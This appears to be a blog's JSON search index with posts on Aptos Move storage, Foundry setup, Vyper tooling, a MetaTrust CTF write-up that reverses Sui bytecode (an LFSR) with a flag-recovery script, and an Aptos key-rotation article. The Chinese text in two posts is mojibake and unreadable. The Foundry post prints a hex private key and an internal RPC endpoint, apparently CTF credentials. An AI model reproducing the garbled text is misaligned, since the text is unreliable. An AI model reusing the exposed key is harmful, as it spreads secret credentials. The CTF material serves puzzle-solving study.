[{"content":"Global Storage move_to\u0026lt;T\u0026gt;(\u0026amp;signer,T) åªèƒ½ move_to è‡ªå·±çš„ accountï¼Œå› ç‚ºè¦å‚³å…¥ \u0026amp;signer åŒä¸€ç¨® resource åªèƒ½æ”¾ä¸€å€‹ borrow_global\u0026lt;T\u0026gt;(address): \u0026amp;T å¯è®€ä»»ä½• account çš„ resource å€¼ï¼Œå‰ææ˜¯ module éœ€è¦å¯¦ä½œé€™å€‹åŠŸèƒ½ borrow_global_mut\u0026lt;T\u0026gt;(address): \u0026amp;mut T å¯è®€å¯« resource å€¼ move_from\u0026lt;T\u0026gt;(address): T exists\u0026lt;T\u0026gt;(address): bool Notes éƒ½éœ€è¦æœ‰ key èƒ½åŠ›çš„ resource resource åªèƒ½åœ¨è¢«å®šç¾©çš„ module å…§æ›´æ”¹ï¼Œéœ€å¯¦ä½œä¸€å€‹ä¿®æ”¹ resource çš„ function Acquires å®šç¾©æ‰€æœ‰é€™å€‹ function æœƒç”¨åˆ°çš„ resource åªéœ€å®šç¾©é€™å€‹ module çš„ï¼Œå°±ç®—æœƒ call åˆ°å…¶ä»– moudule å¯ä»¥ä¸ç”¨ç®¡ module ä¸èƒ½å­˜å–å…¶ä»– module çš„ resource åªè¦ function æœ‰ç”¨åˆ° Global Storage çš„æ“ä½œéƒ½éœ€è¦å¯« Coin coin init å¾Œæœƒæœ‰ burn_cap, mint_cap, freeze_cap burn_cap å¯ä»¥ç›´æ¥ burn ä»»æ„åœ°å€ coinï¼Œä½¿ç”¨ burn_from https://github.com/aptos-labs/aptos-core/blob/main/aptos-move/framework/aptos-framework/sources/coin.move#L332 å‡ç´š å¯ä»¥çœ‹æ˜¯vå¹¾\n1 aptos move list --url https://aptos-mainnet-rpc.allthatnode.com/v1 --account \u0026lt;account\u0026gt; Reference https://www.zellic.io/blog/top-10-aptos-move-bugs/#1-lack-of-generics-type-checking https://move-book.com/index.html https://move-language.github.io/move/ ","date":"2023-11-29T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/aptos-move-note/","title":"Aptos Move Note"},{"content":"Install 1 2 curl -L https://foundry.paradigm.xyz | bash foundryup Init 1 2 forge init hello cd hello build 1 forge build test 1 2 3 4 5 6 forge test forge test -vv # unit tests forge test -m \u0026#34;testExample()\u0026#34; Openzeppelin lib 1 forge install openzeppelin/openzeppelin-contracts Remapping Add remappings to foundry.toml.\n1 remappings = [\u0026#34;@openzeppelin/=lib/openzeppelin-contracts/\u0026#34;] We can import openzeppelin contracts like this:\n1 import \u0026#34;@openzeppelin/contracts/access/Ownable.sol\u0026#34;; Script 1 forge script script/Contract.s.sol:ContractScript --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy -vvvv --broadcast Makefile 1 2 3 4 5 6 7 8 9 -include .env all: build build:; forge build test :; forge test deploy :; forge script script/Solve.s.sol:Solve --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy -vvvv --broadcast Set the .env file:\n1 2 3 RPC_URL=http://10.132.61.18:10033/3695cc9d-4573-4888-91f1-d9ffe61187d0 PRIVATE_KEY=0xf6f246042debbc0c5ddd200e72a3d12e03038d651a5d0c5e744ac30a94e5c3d7 CHAL_ADDR= Remember to load the variables in the .env file.\n1 source .env foundry.toml settings 1 rpc_endpoints = { mainnet = \u0026#34;https://rpc.ankr.com/eth\u0026#34;, optimism = \u0026#34;https://rpc.ankr.com/optimism\u0026#34; , fantom = \u0026#34;https://rpc.ankr.com/fantom\u0026#34;, arbitrum = \u0026#34;https://rpc.ankr.com/arbitrum\u0026#34; , bsc = \u0026#34;http://10.132.83.97:8000/bsc\u0026#34; } Cheat code 1 2 3 4 5 6 7 8 9 10 11 12 13 // fork bsc at block 21157028 vm.createSelectFork(\u0026#34;bsc\u0026#34;, 21157028); // set address(this) 0 ether vm.deal(address(this), 0); vm.startPrank(attacker); vm.stopPrank(); // load address from env chal = Challenge(vm.envAddress(\u0026#34;CHAL_ADDR\u0026#34;)); // load private key from env privKey = uint256(vm.envBytes32(\u0026#34;PRIV_KEY\u0026#34;)); Example script for ctf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; // import { Challenge } from \u0026#34;../src/Challenge.sol\u0026#34;; import { CommonBase } from \u0026#34;forge-std/Base.sol\u0026#34;; import \u0026#34;forge-std/console.sol\u0026#34;; contract Pwn { constructor() payable { // do something... console.log(\u0026#34;print something...\u0026#34;); } } contract Solve is CommonBase { Challenge chal; uint256 privKey; constructor() { chal = Challenge(vm.envAddress(\u0026#34;CHAL_ADDR\u0026#34;)); privKey = uint256(vm.envBytes32(\u0026#34;PRIV_KEY\u0026#34;)); } function run() public { vm.startBroadcast(privKey); Pwn p = new Pwn(); vm.stopBroadcast(); } } Reference Foundry Book ","date":"2023-09-28T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/foundry-notes/","title":"Foundry Notes"},{"content":"Install Vyper 1 pip3 install vyper Tools Vyper intepreter - titanoboa 1 2 3 4 5 # simple.vy @external def foo() -\u0026gt; uint256: x: uint256 = 1 return x + 7 1 2 3 4 5 6 7 \u0026gt;\u0026gt;\u0026gt; import boa \u0026gt;\u0026gt;\u0026gt; simple = boa.load(\u0026#34;examples/simple.vy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; simple.foo() 8 \u0026gt;\u0026gt;\u0026gt; simple.foo()._vyper_type uint256 Compiler bugs https://github.com/vyperlang/vyper/security?page=1\n","date":"2023-09-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/vyper-notes/","title":"Vyper notes"},{"content":" move the bytes to see the truth!\ncode: https://github.com/MetaTrustLabs/ctf/tree/master/bytesMove\nyou need to crack this file and find the flag.\ntips: This is a sui bytecode\nTo disassemble the moveBytes.mv file in the MetaTrust CTF, we used the sui client command-line interface. The sui move disassemble command allowed us to view the assembly code for the Move bytecode.\n1 sui move disassemble moveBytes.mv If you\u0026rsquo;re interested in viewing the assembly code for the moveBytes.mv file, you can check out the code at the following link: https://gist.github.com/ashirleyshe/04a5ed08727a5b06fcda2fc545ed56b8\nThe file contains several functions, including compute, byte_to_u64, slice, and solve. The byte_to_u64 and slice functions are not particularly important.\nCheck the value of the constants:\n1 2 3 4 5 6 7 8 9 Constants [ 0 =\u0026gt; u64: 0000000000000000 1 =\u0026gt; u64: 0100000000000000 2 =\u0026gt; vector\u0026lt;u64\u0026gt;: 00 3 =\u0026gt; vector\u0026lt;u8\u0026gt;: 046374667b // ctf{ 4 =\u0026gt; vector\u0026lt;u8\u0026gt;: 017d // } 5 =\u0026gt; vector\u0026lt;u64\u0026gt;: 20c0000000000000000c000000000000004500000000000000c200000000000000b800000000000000d600000000000000780000000000000010000000000000003a000000000000000b00000000000000f9000000000000004c00000000000000ae00000000000000ba00000000000000a20000000000000083000000000000004d00000000000000d100000000000000f200000000000000a7000000000000000e00000000000000df000000000000002e0000000000000047000000000000000100000000000000a00000000000000080000000000000001900000000000000f500000000000000260000000000000086000000000000004a00000000000000 // [192, 12, 69, 194, 184, 214, 120, 16, 58, 11, 249, 76, 174, 186, 162, 131, 77, 209, 242, 167, 14, 223, 46, 71, 1, 160, 128, 25, 245, 38, 134, 74] ] The solve function is the entry point for the program and accepts a vector as its argument, which represents the flag. The function checks the format of the input, computes a value using the compute function, and then asserts that the input is equal to the ciphertext value.\n1 2 3 4 5 6 entry public solve(Arg0: vector\u0026lt;u8\u0026gt;) { ... check the format of the input compute assert the input is equal to the ciphertext (constants 5) } A loop, check i \u0026lt; 32.\n1 2 3 4 5 6 7 8 9 10 11 12 13 115: LdU64(0) 116: StLoc[4](loc3: u64) B14: 117: CopyLoc[4](loc3: u64) 118: LdU64(32) 119: Lt 120: BrFalse(163) ... 158: MoveLoc[4](loc3: u64) 159: LdU64(1) 160: Add 161: StLoc[4](loc3: u64) 162: Branch(117) An inner loop, check j \u0026lt; 8.\n1 2 3 4 5 6 7 8 9 10 11 12 13 124: LdU64(0) 125: StLoc[5](loc4: u64) B17: 126: CopyLoc[5](loc4: u64) 127: LdU64(8) 128: Lt 129: BrFalse(155) ... 150: MoveLoc[5](loc4: u64) 151: LdU64(1) 152: Add 153: StLoc[5](loc4: u64) 154: Branch(126) The compute function takes the i/4th element of the vector as its first argument and the 2290631716 as its second argument.\n1 2 3 4 5 6 7 8 9 10 11 B19: 131: MutBorrowLoc[19](loc18: vector\u0026lt;u64\u0026gt;) 132: CopyLoc[4](loc3: u64) 133: LdU64(4) 134: Div 135: VecMutBorrow(2) 136: StLoc[10](loc9: \u0026amp;mut u64) 137: CopyLoc[10](loc9: \u0026amp;mut u64) 138: ReadRef 139: LdU64(2290631716) 140: Call compute(u64, u64): u64 * u64 // compute(vec[i/4], 2290631716) 1 2 3 4 5 6 7 8 9 141: StLoc[8](loc7: u64) 142: MoveLoc[10](loc9: \u0026amp;mut u64) 143: WriteRef 144: MoveLoc[20](loc19: u64) 145: LdU8(1) 146: Shl // var \u0026lt;\u0026lt; 1 147: MoveLoc[8](loc7: u64) 148: Xor 149: StLoc[20](loc19: u64) I construct the script like this:\n1 2 3 4 5 6 7 output = [] for i in range(32): tmp = 0 for j in range(8): (vec[i/4], out) = compute(vec[i/4], 2290631716) tmp = (tmp \u0026lt;\u0026lt; 1) ^ out output.append(tmp) Finally, you\u0026rsquo;ll find it is a LFSR.\n1 2 3 4 5 6 7 8 9 def compute(arg0, arg1): loc0 = (arg0 \u0026lt;\u0026lt; 1) \u0026amp; 4294967295 loc1 = arg0 \u0026amp; arg1 \u0026amp; 4294967295 loc2 = 0 while loc1 != 0: loc2 ^= (loc1 \u0026amp; 1) loc1 \u0026gt;\u0026gt;= 1 loc0 ^= loc2 return (loc0, lco2) To crack the flag, I wrote a Python script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ct = [192, 12, 69, 194, 184, 214, 120, 16, 58, 11, 249, 76, 174, 186, 162, 131, 77, 209, 242, 167, 14, 223, 46, 71, 1, 160, 128, 25, 245, 38, 134, 74] def rev_compute(vec, mask): curr = vec \u0026gt;\u0026gt; 1 b = vec \u0026amp; 1 vec \u0026gt;\u0026gt;= 1 while mask: if mask \u0026amp; 1: b ^= vec \u0026amp; 1 vec \u0026gt;\u0026gt;= 1 mask \u0026gt;\u0026gt;= 1 return curr | (b \u0026lt;\u0026lt; 31) mask = 2290631716 s0 = int.from_bytes(ct[:4], \u0026#34;big\u0026#34;) s1 = int.from_bytes(ct[4:8], \u0026#34;big\u0026#34;) s2 = int.from_bytes(ct[8:12], \u0026#34;big\u0026#34;) s3 = int.from_bytes(ct[12:16], \u0026#34;big\u0026#34;) s4 = int.from_bytes(ct[16:20], \u0026#34;big\u0026#34;) s5 = int.from_bytes(ct[20:24], \u0026#34;big\u0026#34;) s6 = int.from_bytes(ct[24:28], \u0026#34;big\u0026#34;) s7 = int.from_bytes(ct[28:32], \u0026#34;big\u0026#34;) for _ in range(32): s0 = rev_compute(s0, mask) s1 = rev_compute(s1, mask) s2 = rev_compute(s2, mask) s3 = rev_compute(s3, mask) s4 = rev_compute(s4, mask) s5 = rev_compute(s5, mask) s6 = rev_compute(s6, mask) s7 = rev_compute(s7, mask) print(s7.to_bytes(4, \u0026#34;big\u0026#34;) + s6.to_bytes(4, \u0026#34;big\u0026#34;) + s2.to_bytes(4, \u0026#34;big\u0026#34;) + s5.to_bytes(4, \u0026#34;big\u0026#34;) + s4.to_bytes(4, \u0026#34;big\u0026#34;) + s3.to_bytes(4, \u0026#34;big\u0026#34;) + s1.to_bytes(4, \u0026#34;big\u0026#34;) + s0.to_bytes(4, \u0026#34;big\u0026#34;)) ","date":"2023-09-18T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/metatrust-ctf-writeup-bytesmove/","title":"Metatrust CTF Writeup - BytesMove"},{"content":"Overview åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å€‘å°‡æ·±å…¥æ¢è¨ Aptos å¯†é‘°è¼ªæ›çš„æ¦‚å¿µåŠå…¶é‡è¦æ€§ã€‚åœ¨é–‹å§‹ä¹‹å‰ï¼Œè®“æˆ‘å€‘å…ˆäº†è§£ä»€éº¼æ˜¯ Aptos å¸³æˆ¶ã€å…¬é‘°å’Œç§é‘°çš„ä½œç”¨ã€‚ç•¶ç§é‘°æ´©æ¼æ™‚ï¼Œä½ çš„å¸³æˆ¶å°±å¯èƒ½é­åˆ°æ”»æ“Šï¼Œä½†è‹¥æƒ³ä¿ç•™åŸæœ‰å¸³æˆ¶ä¸¦ç¢ºä¿è³‡ç”¢å®‰å…¨ï¼Œå°±éœ€è¦ä½¿ç”¨å¯†é‘°è¼ªæ›æŠ€è¡“ã€‚Aptos å¸³æˆ¶æ”¯æŒå¯†é‘°è¼ªæ›ï¼Œè®“ä½ æ›´æ”¹ç§é‘°è€Œä¸å¿…å‰µå»ºæ–°å¸³æˆ¶ï¼Œç¹¼è€Œä¿ç•™åŸæœ‰å¸³æˆ¶çš„è³‡ç”¢å’Œèº«ä»½ã€‚\næ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å°‡ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ Aptos cli åŠ Python SDK å®Œæˆå¯†é‘°è¼ªæ›ï¼Œè®“ä½ èƒ½å¤ éš¨æ™‚ä¿æŒå¸³æˆ¶è³‡ç”¢åŠèº«ä»½çš„å®‰å…¨ã€‚\nä»€éº¼æ˜¯å¸³æˆ¶ï¼ˆaccountï¼‰ï¼Ÿ æ¯å€‹ Aptos å¸³æˆ¶ä»£è¡¨è‘—å€å¡Šéˆä¸Šä¸€å€‹å¯ä»¥ç™¼é€äº¤æ˜“çš„å¯¦é«”ï¼Œä¸¦ç”±ç‰¹å®šçš„ 32 å­—ç¯€å¸³æˆ¶åœ°å€è­˜åˆ¥ã€‚é€™å€‹å¸³æˆ¶æ˜¯ Move æ¨¡çµ„å’Œ Move è³‡æºçš„å®¹å™¨ï¼Œå¯ä»¥åŒ…å«å€å¡Šéˆè³‡ç”¢ï¼ˆä¾‹å¦‚ coin å’Œ NFTï¼‰ã€‚é€™äº›è³‡ç”¢åœ¨å€å¡Šéˆå¸³æˆ¶ä¸­è¡¨ç¤ºç‚ºè³‡æºï¼ŒåŒæ™‚å¸³æˆ¶ä¹Ÿå¯ä»¥åŸ·è¡Œå„ç¨®æ“ä½œï¼Œä¾‹å¦‚å°‡è³‡æºç™¼é€çµ¦å…¶ä»–äººã€‚å°±åƒåœ¨ Web2 çš„ä¸–ç•Œä¸­ï¼Œä½ çš„é›»å­éƒµä»¶åœ°å€ä»£è¡¨è‘—ä½ çš„é›»å­éƒµä»¶å¸³æˆ¶ï¼Œè€Œåœ¨ Aptos å€å¡Šéˆä¸­ï¼Œå¸³æˆ¶åœ°å€ä»£è¡¨è‘—å¸³æˆ¶æœ¬èº«ï¼Œä½ å¯ä»¥é€éé€™å€‹åœ°å€é€²è¡Œæ”¶ç™¼è³‡ç”¢ç­‰æ“ä½œã€‚\nå…¬é‘°ï¼ˆpublic keyï¼‰ã€ç§é‘°ï¼ˆprivate keyï¼‰ ç§é‘°åœ¨ Aptos å€å¡Šéˆèˆ‡å…¶ä»–å€å¡Šéˆä¸€æ¨£ï¼Œå¯ä»¥ç”¨ä¾†ç°½ç½²äº¤æ˜“ä»¥ä½¿å…¶è¢«èªå¯å’Œé©—è­‰ï¼Œå°±åƒåœ¨ç¾å¯¦ç”Ÿæ´»ä¸­éœ€è¦ç°½åæˆ–è¼¸å…¥å¯†ç¢¼æ‰èƒ½å¤ è½‰å¸³ã€‚ç°½ç½²éå¾Œçš„äº¤æ˜“æ‰èƒ½å¤ å°ä½ çš„å¸³æˆ¶è³‡ç”¢é€²è¡Œæ›´æ”¹ï¼Œä½†æ˜¯åªæœ‰æ“æœ‰ç§é‘°çš„äººæ‰èƒ½å¤ ç°½ç½²é€™ç­†äº¤æ˜“ï¼Œå› æ­¤ç§é‘°æ˜¯éå¸¸é‡è¦ä¸”æ•æ„Ÿçš„ä¸€çµ„æ•¸æ“šã€‚\nåœ¨å…¶ä»–å€å¡Šéˆä¸Šï¼Œä½ çš„å…¬é–‹èº«ä»½å³ç‚ºç§é‘°å°æ‡‰çš„å…¬é‘°ï¼Œåœ°å€å¯ä»¥å¾å…¬é‘°è¢«æ¨ç®—å‡ºä¾†ï¼Œå…¬é‘°ä¹Ÿè¢«ç”¨ä¾†é©—è­‰ç°½ç« ã€‚ç„¶è€Œï¼ŒAptos æ”¯æ´å¯†é‘°è¼ªæ›ï¼Œå°è‡´å…¬é‘°å¯èƒ½æœƒç™¼ç”Ÿè®ŠåŒ–ï¼Œå› æ­¤ä½¿ç”¨åœ°å€ä¾†ä»£è¡¨å¸³æˆ¶ã€‚å‚³çµ±ä¸Šï¼Œæ¯å€‹å¸³æˆ¶éƒ½æœ‰ä¸€å€‹ç‰¹å®šçš„åœ°å€ä½œç‚ºå…¶è­˜åˆ¥ç¬¦è™Ÿï¼Œè€Œä¸”é€™å€‹åœ°å€æ˜¯ä¸æœƒæ”¹è®Šçš„ã€‚åœ¨ Aptos ä¸­ï¼Œå³ä½¿æ‚¨æ›´æ”¹äº†èº«ä»½é©—è­‰å¯†é‘°ï¼ˆå…¶ä¸­åŒ…å«å…¬é‘°ï¼‰ï¼Œå¸³æˆ¶åœ°å€ä»ç„¶æ˜¯å”¯ä¸€çš„ï¼Œä¸¦ä¸”ä¸æœƒç™¼ç”Ÿè®ŠåŒ–ã€‚\nèº«ä»½é©—è­‰å¯†é‘°ï¼ˆauthentication keyï¼‰ Aptos å€å¡Šéˆæ”¯æ´å–®ç°½å’Œå¤šç°½å¸³æˆ¶ã€‚å¤šç°½å¸³æˆ¶å…è¨±å¤šå€‹ç”¨æˆ¶å…±åŒåŸ·è¡Œæ•¸ä½ç°½ç« ä¾†ç®¡ç†å¸³æˆ¶è³‡ç”¢ã€‚ä¾‹å¦‚ï¼Œæƒ³åƒä¸€å€‹æ“æœ‰å…©æŠŠé–å’Œå…©æŠŠé‘°åŒ™çš„ä¿éšªç®±ï¼Œä¸€æŠŠé‘°åŒ™ç”± Alice æŒæœ‰ï¼Œå¦ä¸€æŠŠå‰‡ç”± Bob æŒç®¡ã€‚æ‰“é–‹æ­¤ä¿éšªç®±çš„å”¯ä¸€è¾¦æ³•å°±æ˜¯å…©å€‹äººåŒæ™‚æä¾›é‘°åŒ™é–‹é–ï¼Œåªæœ‰å…¶ä¸­ä¸€æŠŠé‘°åŒ™æ™‚å‰‡ç„¡æ³•æ‰“é–‹ã€‚å¤šç°½å¸³æˆ¶èˆ‡æ­¤é¡ä¼¼ï¼Œå®ƒæ˜¯ä»£è¡¨å¤šæ–¹çš„å–®ä¸€å¸³æˆ¶ï¼Œæ‰€æœ‰ç™¼ç”Ÿçš„äº¤æ˜“éƒ½éœ€è¦æ‰€æœ‰åƒèˆ‡æ–¹çš„ç°½åï¼Œä¹Ÿå¯ä»¥è¢«è¨­å®šä¸€å€‹é–¾å€¼ï¼Œèˆ‰å€‹ä¾‹å­ï¼Œ2-of-3 ä»£è¡¨ä¸‰ä½ä¸­åªè¦æœ‰å…©å€‹ç°½ç½²å³å¯å®Œæˆäº¤æ˜“ã€‚\nå¤šç°½å¸³æˆ¶ä½¿ç”¨å¤šå€‹ï¼ˆç§é‘°ï¼Œå…¬é‘°ï¼‰å¯†é‘°å°ï¼Œæ²’æœ‰å–®å€‹å…¬é‘°æœƒä»£è¡¨é€™å€‹å¸³æˆ¶ã€‚å› æ­¤ï¼Œæˆ‘å€‘éœ€è¦ä¸€å€‹ä»£è¡¨æ­¤å¸³æˆ¶çš„å¯†é‘°ï¼Œä»¥ä¾¿å°è£å¤šç°½å¸³æˆ¶ä¸­æ‰€æœ‰ç”¨æˆ¶çš„å…¬é‘°ï¼Œé€™å€‹ä»£è¡¨æ­¤å¸³æˆ¶çš„å¯†é‘°ä¹Ÿå°±æ˜¯æ‰€è¬‚çš„èº«ä»½é©—è­‰å¯†é‘°ã€‚\nèº«ä»½é©—è­‰å¯†é‘°æ˜¯è¡¨ç¤ºå¤šç°½å¸³æˆ¶ä¸­æ‰€æœ‰ç”¨æˆ¶çš„ä¸€ç¨®æ–¹å¼ã€‚ç°¡è€Œè¨€ä¹‹ï¼Œèº«ä»½é©—è­‰å¯†é‘°æ˜¯é€šéé€£æ¥æ‰€æœ‰åƒèˆ‡ç”¨æˆ¶çš„å…¬é‘°çš„ä¸²è¯æ•£åˆ—å‰µå»ºçš„ã€‚\n1 auth_key = sha3-256(pubkey_1 | . . . | pubkey_n | K | 0x01) å…¶ä¸­Kæ˜¯é©—è­‰äº¤æ˜“æ‰€éœ€çš„ç°½åé–¾å€¼ï¼Œ0x01ç‚º 1-byte å¤šç°½æ–¹æ¡ˆæ¨™è­˜ç¬¦ã€‚\nå°æ–¼å–®ç°½å¸³æˆ¶ï¼Œä¹Ÿå­˜åœ¨èº«ä»½é©—è­‰å¯†é‘°ï¼Œå–®ç°½å¸³æˆ¶çš„èº«ä»½é©—è­‰å¯†é‘°åªå°è£äº†ä¸€å€‹å…¬é‘°ä¾†ä»£è¡¨å¸³æˆ¶ï¼Œé€™æ¨£åšæ˜¯ç‚ºäº†åœ¨æ‰€æœ‰é¡å‹çš„å¸³æˆ¶ä¸Šä¿æŒä¸€è‡´æ€§ã€‚\n1 auth_key = sha3-256(pubkey_A | 0x00) å…¶ä¸­ 0x00 ç‚º 1-byte å–®ç°½æ–¹æ¡ˆæ¨™è­˜ç¬¦ã€‚\næˆ‘å€‘å¯ä»¥èªªï¼Œèº«ä»½é©—è­‰å¯†é‘°æ˜¯ç§é‘°çš„å»£ç¾©å…¬å…±è¡¨ç¤ºã€‚\nå¸³æˆ¶åœ°å€ åœ¨å¸³æˆ¶å‰µå»ºéç¨‹ä¸­ï¼Œç”¢ç”Ÿä¸€çµ„å…¬é‘°åŠç§é‘°å¾Œï¼Œæœƒè¨ˆç®—å‡ºä¸€å€‹ 32 å­—ç¯€çš„èº«ä»½é©—è­‰å¯†é‘°ï¼Œé€™å€‹èº«ä»½é©—è­‰å¯†é‘°å°‡ä½œç‚ºå¸³æˆ¶åœ°å€ã€‚\nå–®ç°½å¸³æˆ¶ï¼š\n1 auth_key = sha3-256(pubkey_A | 0x00) å…¶ä¸­ 0x00 ç‚º 1-byte å–®ç°½æ–¹æ¡ˆæ¨™è­˜ç¬¦ã€‚\nå¤šç°½å¸³æˆ¶ï¼š\n1 auth_key = sha3-256(pubkey_1 | . . . | pubkey_n | K | 0x01) å…¶ä¸­Kæ˜¯é©—è­‰äº¤æ˜“æ‰€éœ€çš„ç°½åé–¾å€¼ï¼Œ0x01ç‚º 1-byte å¤šç°½æ–¹æ¡ˆæ¨™è­˜ç¬¦ã€‚\nä½†æ˜¯ï¼Œå¯†é‘°è¼ªæ›å¾Œï¼Œèº«ä»½é©—è­‰å¯†é‘°æœƒç™¼ç”Ÿè®ŠåŒ–ï¼Œç•¶ç”Ÿæˆæ–°çš„å…¬é‘°-ç§é‘°å°æ™‚ï¼Œå…¬é‘°å°‡è¼ªæ›å¯†é‘°ã€‚ä½†å¸³æˆ¶åœ°å€ä¸æœƒæ”¹è®Šã€‚å› æ­¤ï¼Œåƒ…åœ¨æœ€åˆï¼Œ32 å­—ç¯€èº«ä»½é©—è­‰å¯†é‘°æ‰æœƒèˆ‡ 32 å­—ç¯€å¸³æˆ¶åœ°å€ç›¸åŒã€‚å¸³æˆ¶èˆ‡é‡‘é‘°è§£è€¦çš„æ–¹æ³•ä½¿ Aptos èƒ½å¤ ç„¡ç¸«æ–°å¢æ–°çš„æ•¸ä½ç°½åæ¼”ç®—æ³•ä»¥æ”¯æ´å…¬é‘°å’Œç§é‘°å‹åˆ¥ã€‚\nå¸³æˆ¶å‰µå»ºå¾Œï¼Œå„˜ç®¡ç§é‘°ã€å…¬é‘°å’Œèªè­‰å¯†é‘°å¯èƒ½ç™¼ç”Ÿè®ŠåŒ–ï¼Œä½†å¸³æˆ¶åœ°å€å°‡ä¿æŒä¸è®Šã€‚\nç‚ºä»€éº¼æˆ‘å€‘éœ€è¦å¯†é‘°è¼ªæ›ï¼Ÿ ç•¶ç§é‘°æ´©æ¼æ™‚ï¼Œä½ çš„å¸³æˆ¶å°±å¯èƒ½é­åˆ°æ”»æ“Šã€‚åœ¨ web2 ä¸­ï¼Œå¤šæ•¸äººæœƒå®šæœŸä¿®æ”¹å¯†ç¢¼ï¼Œæ¸›å°‘è¢«ç›œçš„é¢¨éšªï¼Œé‚„æœ‰åœ¨ Instagram æˆ– Facebook å¸³æˆ¶è¢«ç›œå¾Œï¼Œä½ å¯ä»¥é€éå…¶ä»–æ–¹å¼é©—è­‰èº«ä»½ï¼Œä¿®æ”¹å¯†ç¢¼ä¸¦æ‹¿å›è‡ªå·±çš„å¸³è™Ÿã€‚ä½†æ˜¯ï¼Œåœ¨å¤§å¤šæ•¸å€å¡Šéˆä¸­ï¼Œæƒ…æ³ä¸¦ä¸é‚£éº¼ç°¡å–®ã€‚ç§é‘°èˆ‡å…¬é‘°æˆå°å‡ºç¾ï¼Œè€Œéˆä¸Šèº«ä»½èˆ‡ç§é‘°ç¶å®šï¼Œå”¯ä¸€çš„è§£æ±ºæ–¹æ³•æ˜¯å‰µå»ºä¸€å€‹æ–°å¸³æˆ¶ï¼Œä½¿ç”¨æ–°çš„å…¬é‘°å’Œç§é‘°å°ä¸¦å°‡æ‰€æœ‰è³‡ç”¢è½‰ç§»åˆ°è©²å¸³æˆ¶ä¸­ã€‚\nç„¶è€Œï¼Œé€™ç¨®æ–¹æ³•æœƒé€ æˆå¾ˆå¤šå•é¡Œï¼Œä¾‹å¦‚å¤±å»åŸæœ‰çš„å¸³æˆ¶è³‡ç”¢ã€OG èº«ä»½çš„è±¡å¾µã€ä»¥åŠåƒèˆ‡éçš„æ´»å‹•çš„ç´€å¿µç­‰ã€‚å› æ­¤ï¼Œå¯†é‘°è¼ªæ›æŠ€è¡“æ‡‰é‹è€Œç”Ÿã€‚Aptos å¸³æˆ¶æ”¯æ´å¯†é‘°è¼ªæ›ï¼Œè®“ä½ æ›´æ”¹ç§é‘°è€Œä¸å¿…å‰µå»ºæ–°å¸³æˆ¶ï¼Œå¾è€Œä¿ç•™åŸæœ‰å¸³æˆ¶çš„è³‡ç”¢å’Œèº«ä»½ã€‚é€™æ„å‘³è‘—ä½ å¯ä»¥ä¿æŒåŸæœ‰åœ°å€ï¼Œå…¶ä»–äººä»ç„¶å¯ä»¥ä½¿ç”¨ä½ åŸæœ¬çš„åœ°å€å‘ä½ ç™¼é€è³‡ç”¢ã€‚å”¯ä¸€æœƒæ”¹è®Šçš„æ˜¯èº«ä»½é©—è­‰å¯†é‘°ï¼Œå› ç‚ºå®ƒæ˜¯ç”±å…¬é‘°è¨ˆç®—å‡ºä¾†çš„ã€‚\nå¯†é‘°è¼ªæ›æŠ€è¡“å¯¦ç¾äº†éˆä¸Šèº«ä»½èˆ‡å®‰å…¨æ€§åˆ†é›¢ï¼Œç•¶ç§é‘°æ´©æ¼æ™‚ï¼Œä½ å¯ä»¥æ›¿æ›æ‰ç§é‘°ï¼Œå¾è€Œä¿è­·è³‡ç”¢å…æ–¼å—åˆ°æå¤±æˆ–ç«Šå–ã€‚æ­¤å¤–ï¼Œå¯†é‘°è¼ªæ›ä¹Ÿä½¿å¾—æˆ‘å€‘å¯ä»¥å®šæœŸæ›´æ”¹å¯†é‘°ï¼Œæ¸›å°‘ç§é‘°è¢«ç›œå–çš„é¢¨éšªï¼ŒåŒæ™‚ä¹Ÿç‚ºä½¿ç”¨å¤šç°½å¸³æˆ¶æä¾›äº†æ›´å¤šå½ˆæ€§ã€‚\nAuthentication key rotation å¯†é‘°è¼ªæ›ï¼Œåœ¨ Aptos ä¸­æº–ç¢ºä¾†èªªç¨±ç‚ºèº«ä»½é©—è­‰å¯†é‘°è¼ªæ›ï¼ˆAuthentication key rotationï¼‰ã€‚\naccount.move æ¨¡å¡ŠåŒ…å«äº† Aptos å¸³æˆ¶ç›¸é—œçš„æ‰€æœ‰å‡½æ•¸ã€‚ ç”¨æˆ¶å¯ä»¥é€é account::rotate_authentication_key å‡½æ•¸ä¾†é”æˆå¯†é‘°è¼ªæ›ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 public entry fun rotate_authentication_key( account: \u0026amp;signer, from_scheme: u8, from_public_key_bytes: vector\u0026lt;u8\u0026gt;, to_scheme: u8, to_public_key_bytes: vector\u0026lt;u8\u0026gt;, cap_rotate_key: vector\u0026lt;u8\u0026gt;, cap_update_table: vector\u0026lt;u8\u0026gt;, ) acquires Account, OriginatingAddress { ... } ç‚ºäº†æˆæ¬Šè¼ªæ›ï¼Œæˆ‘å€‘éœ€è¦å…©å€‹ç°½åï¼š\ncap_rotate_key æ˜¯æŒ‡å¸³æˆ¶ç›®å‰æ“æœ‰è€…å° RotationProofChallenge çš„ç°½åï¼Œè­‰æ˜ç”¨æˆ¶æ‰“ç®—ä¸¦å…·æœ‰èƒ½åŠ›è¼ªæ›æ­¤å¸³æˆ¶çš„èº«ä»½é©—è­‰é‡‘é‘° cap_update_table æ˜¯æŒ‡æ‰€éœ€è¼ªæ›è‡³çš„æ–°é‡‘é‘°ï¼ˆå¸³æˆ¶æ“æœ‰è€…æƒ³è¦è¼ªæ›çš„é‡‘é‘°ï¼‰å°RotationProofChallenge çš„ç°½åï¼Œè­‰æ˜ç”¨æˆ¶æ“æœ‰æ–°çš„ç§é‘°ï¼Œä¸¦æœ‰æ¬Šæ›´æ–° OriginatingAddress æ˜ 